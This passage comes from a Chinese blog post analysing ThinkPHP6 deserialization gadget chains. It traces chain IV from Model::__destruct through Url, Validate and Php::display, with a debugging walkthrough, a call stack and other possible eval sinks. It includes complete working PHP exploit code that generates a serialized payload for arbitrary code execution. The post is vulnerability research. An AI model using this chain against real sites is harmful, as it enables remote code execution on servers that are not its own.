+<p>最终形如 <code>[可控](可控,可控)</code> 的形式在 <code>vendor/topthink/framework/src/think/Validate.php</code> 文件 <code>Validate</code> 类的 <code>is</code> 方法中👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120125301644.png" alt="image-20220120125301644"></p>
+<h4 id="分析-4">- 分析 -</h4>
+<p>那么这里直接由 <code>__toString</code> 方法作为入口了，看 <code>vendor/topthink/framework/src/think/route/Url.php</code> 文件 <code>Url</code> 类中的 <code>__toString</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120125607738.png" alt="image-20220120125607738"></p>
+<p>跟进 <code>build</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120130737944.png" alt="image-20220120130737944"></p>
+<p>这么一看就一目了然了，这里只需要将 <code>url</code> 属性构造成 <code>a:</code> 或直接单纯的 <code>''</code> 就能到达关键部分，之后就可以得到形如 <code>$this-&gt;[可控]-&gt;[不可控]([字符型]可控)</code> 的形式了。</p>
+<p>接下来需要全局搜索 <code>__call</code> 方法的类，而 <code>vendor/topthink/framework/src/think/Validate.php</code> 文件中的 <code>__call</code> 方法正是关键👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120131314642.png" alt="image-20220120131314642"></p>
+<p>直接跟进 <code>is</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120131803255.png" alt="image-20220120131803255"></p>
+<p>不妨跟进 <code>Str::camel</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120132722422.png" alt="image-20220120132722422"></p>
+<p>经过这个 <code>Str::camel</code> 方法处理后，实际上传入的 <code>getDomainBind</code> 值根本就没有发生变化，即得到的值依旧为 <code>getDomainBind</code> 所以下面的一群 <code>case</code> 是没有一个符合的，会直接跳到 <code>default</code> 部分。此时再满足 <code>type</code> 数组属性存在 <code>$rule</code> 参数值的键名即可来到关键的 <code>$result = call_user_func_array($this-&gt;type[$rule], [$value]);</code> 语句，之后就是很传统的调用 <code>Php</code> 类的 <code>Display</code> 方法了。</p>
+<p>以下是该链条的简单类示意👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span>, <span class="title">ArrayAccess</span>, <span class="title">Arrayable</span>, <span class="title">Jsonable</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Url</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Validate</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is</span>(<span class="params"><span class="variable">$value</span>, <span class="keyword">string</span> <span class="variable">$rule</span>, <span class="keyword">array</span> <span class="variable">$data</span> = []</span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Php</span> <span class="keyword">implements</span> <span class="title">TemplateHandlerInterface</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$content</span>, <span class="keyword">array</span> <span class="variable">$data</span> = []</span>)</span>&#123;&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<h4 id="exp-动调-4">- exp&amp;动调 -</h4>
+<p>先上 <code>exp</code> 👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">contract</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">Arrayable</span>&#123;&#125;</span><br><span class="line">	<span class="title">interface</span> <span class="title">Jsonable</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">	<span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">		<span class="title">private</span> $<span class="title">data</span>=[7];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">route</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">Validate</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Url</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$url</span>=<span class="string">&quot;a:&quot;</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$route</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$domain</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;domain = <span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27; ?&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;route = <span class="keyword">new</span> Validate;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;request = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;app=<span class="keyword">$this</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">contract</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">TemplateHandlerInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">TemplateHandlerInterface</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Php</span> <span class="keyword">implements</span> <span class="title">TemplateHandlerInterface</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="title">use</span> <span class="title">JsonSerializable</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">ArrayAccess</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">Arrayable</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">Jsonable</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>\<span class="title">Php</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span>, <span class="title">ArrayAccess</span>, <span class="title">Arrayable</span>, <span class="title">Jsonable</span></span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">		<span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>): <span class="title">mixed</span></span>&#123;&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>): <span class="title">bool</span></span>&#123;&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>): <span class="title">mixed</span></span>&#123;&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>,<span class="variable">$value</span></span>): <span class="title">void</span></span>&#123;&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>): <span class="title">void</span></span>&#123;&#125;	</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Validate</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$type</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;type = [<span class="string">&quot;getDomainBind&quot;</span>=&gt;[<span class="keyword">new</span> Php,<span class="string">&quot;display&quot;</span>]];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">route</span>\<span class="title">Url</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;table = <span class="keyword">new</span> Url(<span class="variable">$code</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="keyword">new</span> Pivot(<span class="string">&#x27;phpinfo();&#x27;</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来对 <strong>exp</strong> 进行动调，入口从 <code>think\route\Url</code> 类的 <code>__toString</code> 方法开始👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120135831752.png" alt="image-20220120135831752"></p>
+<p>跟进 <code>build</code> 方法，先是有关 <code>if (0 === strpos($url, '[') &amp;&amp; $pos = strpos($url, ']'))</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120140042041.png" alt="image-20220120140042041"></p>
+<p>接着是 <code>if (false === strpos($url, '://') &amp;&amp; 0 !== strpos($url, '/'))</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120140159896.png" alt="image-20220120140159896"></p>
+<p>然后是 <code>$url  = !empty($info['path']) ? $info['path'] : '';</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120140402285.png" alt="image-20220120140402285"></p>
+<p>之后由于 <code>$url</code> 变量值为 <code>''</code> ，这条 <code>if ($url) </code> 条件可以直接跳过👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120140530489.png" alt="image-20220120140530489"></p>
+<p>再往下看 <code>if (!empty($rule) &amp;&amp; $match = $this-&gt;getRuleUrl($rule, $vars, $domain))</code> 以及 <code>elseif (!empty($rule) &amp;&amp; isset($name))</code> 这两个条件，显然 <code>$rule</code> 未被定义，也就是空的，这两个条件部分也可以直接跳过👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120140714407.png" alt="image-20220120140714407"></p>
+<p>最后是在调用 <code>getDomainBind</code> 方法前的参数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120140859281.png" alt="image-20220120140859281"></p>
+<p>跟进 <code>think\Validate</code> 类的 <code>__call</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120141159796.png" alt="image-20220120141159796"></p>
+<p>继续看 <code>is</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120141346363.png" alt="image-20220120141346363"></p>
+<p>跟进 <code>Str::camel</code> 方法，可以看到传入的 <code>$rule</code> 参数是原样的返回了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120141602491.png" alt="image-20220120141602491"></p>
+<p>此时也就会到达 <code>default</code> 部分的 <code>$result = call_user_func_array($this-&gt;type[$rule], [$value]);</code> 语句了，在调用这个关键方法前可以看一下传入的参数内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120141839801.png" alt="image-20220120141839801"></p>
+<p>最后跟进 <code>Php</code> 类的 <code>display</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120141945342.png" alt="image-20220120141945342"></p>
+<p>再看一下浏览器，可以发现 <code>phpinfo();</code> 被成功执行👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120143053778.png" alt="image-20220120143053778"></p>
+<p>以上为对链条IV的分析。</p>
+<h4 id="调用栈-4">- 调用栈 -</h4>
+<ul>
+<li><code>Php.php:103, think\view\driver\Php-&gt;display()</code></li>
+<li><code>Validate.php:873, call_user_func_array:&#123;F:\phpEnv\web\php73\tps\vendor\topthink\framework\src\think\Validate.php:873&#125;()</code></li>
+<li><code>Validate.php:873, think\Validate-&gt;is()</code></li>
+<li><code>Validate.php:1686, call_user_func_array:&#123;F:\phpEnv\web\php73\tps\vendor\topthink\framework\src\think\Validate.php:1686&#125;()</code></li>
+<li><code>Validate.php:1686, think\Validate-&gt;__call()</code></li>
+<li><code>Url.php:429, think\Validate-&gt;getDomainBind()</code></li>
+<li><code>Url.php:429, think\route\Url-&gt;build()</code></li>
+<li><code>Url.php:505, think\route\Url-&gt;__toString()</code></li>
+<li><code>Model.php:564, think\model\Pivot-&gt;checkAllowFields()</code></li>
+<li><code>Model.php:614, think\model\Pivot-&gt;updateData()</code></li>
+<li><code>Model.php:535, think\model\Pivot-&gt;save()</code></li>
+<li><code>Model.php:1059, think\model\Pivot-&gt;__destruct()</code></li>
+</ul>
+<hr>
+<h2 id="总结">- 总结 -</h2>
+<p>总的来说，经过这一系列的分析后，对 <code>thinkphp</code> 的 <code>eval</code> 型序列化链可以从 <code>[可控](可控,(数组)可控)</code> 和 <code>[可控](可控)</code> 延伸到形如 <code>$this-&gt;[可控]-&gt;[不可控]((字符型)可控)</code> 的形式。如果这么一看其实通过 <strong>入口一</strong> 可达成的 <code>eval</code> 链还是有不少的，就不再深挖了，简单列出几个罢：</p>
+<ul>
+<li><code>vendor/league/flysystem-cached-adapter/src/Storage/Psr6Cache.php</code> 文件 <code>Psr6Cache</code> 类的 <code>save</code> 方法</li>
+<li><code>vendor/league/flysystem-cached-adapter/src/Storage/Stash.php</code> 文件 <code>Stash</code> 类的 <code>save</code> 方法</li>
+</ul>
+<p>以上都可以通过 <code>$this-&gt;[可控]-&gt;[不可控]((字符型)可控)</code> 的形式到达最终的 <code>eval</code> 。</p>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          
+          <li class="next">
+            <a href="/posts/3778261501/" data-toggle="tooltip" data-placement="top" title="漏洞复现 - weblogic(一)">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。也欢迎您共享此博客，以便更多人可以参与。如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。谢谢 ！
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=漏洞挖掘 - thinkphp6序列化链(一)&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/1675626419/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 4. disqus comment -->
+
+  <!-- disqus comment start -->
+
+  <div class="comment">
+    <div id="disqus_thread" class="disqus-thread"></div>
+  </div>
+
+  <!-- disqus embedded js code start (one page only need to embed once) -->
+  <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "moryyds-1";
+    var disqus_identifier = "https://morblog.cc/posts/1675626419/";
+    var disqus_url = "https://morblog.cc/posts/1675626419/";
+
+    (function () {
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <!-- disqus embedded js code start end -->
+
+  <!-- disqus comment end -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">目录</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">漏洞挖掘 - thinkphp6序列化链(一)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 前言 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%9B%AE%E7%9A%84"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- 目的 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%85%A5%E5%8F%A3%E4%B8%80"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- 入口一 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%93%BE%E6%9D%A1I-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">- 链条I (任意文件写入) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%88%E7%82%B9"><span class="toc-nav-number">1.3.1.1.</span> <span class="toc-nav-text">- 终点 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90"><span class="toc-nav-number">1.3.1.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#exp-%E5%8A%A8%E8%B0%83"><span class="toc-nav-number">1.3.1.3.</span> <span class="toc-nav-text">- exp&amp;动调 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-nav-number">1.3.1.4.</span> <span class="toc-nav-text">- 调用栈 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-nav-number">1.3.1.5.</span> <span class="toc-nav-text">- 扩展 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%93%BE%E6%9D%A1II-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">- 链条II (任意代码执行) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%88%E7%82%B9-2"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">- 终点 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-nav-number">1.3.2.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#exp-%E5%8A%A8%E8%B0%83-2"><span class="toc-nav-number">1.3.2.3.</span> <span class="toc-nav-text">- exp&amp;动调 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-2"><span class="toc-nav-number">1.3.2.4.</span> <span class="toc-nav-text">- 调用栈 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%85%A5%E5%8F%A3%E4%BA%8C"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- 入口二 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%93%BE%E6%9D%A1III-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">- 链条III (任意代码执行) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%88%E7%82%B9-3"><span class="toc-nav-number">1.4.1.1.</span> <span class="toc-nav-text">- 终点 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-nav-number">1.4.1.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#exp-%E5%8A%A8%E8%B0%83-3"><span class="toc-nav-number">1.4.1.3.</span> <span class="toc-nav-text">- exp&amp;动调 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-3"><span class="toc-nav-number">1.4.1.4.</span> <span class="toc-nav-text">- 调用栈 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%93%BE%E6%9D%A1IV-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">- 链条IV (任意代码执行) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%88%E7%82%B9-4"><span class="toc-nav-number">1.4.2.1.</span> <span class="toc-nav-text">- 终点 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-4"><span 